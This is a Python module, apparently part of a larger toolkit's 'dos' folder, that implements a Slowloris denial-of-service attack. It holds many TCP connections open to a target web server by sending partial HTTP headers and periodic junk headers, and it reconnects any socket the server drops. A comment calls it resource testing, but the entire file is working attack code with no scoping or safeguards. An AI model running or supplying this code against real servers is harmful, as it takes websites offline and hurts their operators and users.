# modules/dos/slowloris.py
# Conceptual workflow for low-and-slow HTTP resource testing

import socket
import time
import random
import threading

def init_socket(target_ip, target_port):
   # Establishes a valid TCP connection and sends a partial HTTP header.
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, target_port))
        
        # Send an incomplete HTTP GET request header
        # Notice the lack of the final double trailing newlines (\r\n\r\n)
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None

def run_slowloris(target_ip, target_port, socket_count, keepalive_interval):
    # Maintains a pool of 'socket_count' connections.
    # Periodically sends junk headers to keep the web server waiting.
    sockets = []
    
    # 1. Initialize the target connection pool
    for _ in range(socket_count):
        s = init_socket(target_ip, target_port)
        if s:
            sockets.append(s)
            
    # 2. Keepalive loop
    while True:
        # Send a tiny bit of additional data to reset the server's idle timeout
        for i, s in enumerate(sockets):
            try:
                # Send a harmless custom header that keeps the request pending
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                # If the server dropped the connection, rebuild it
                sockets[i] = init_socket(target_ip, target_port)
                
        time.sleep(keepalive_interval)
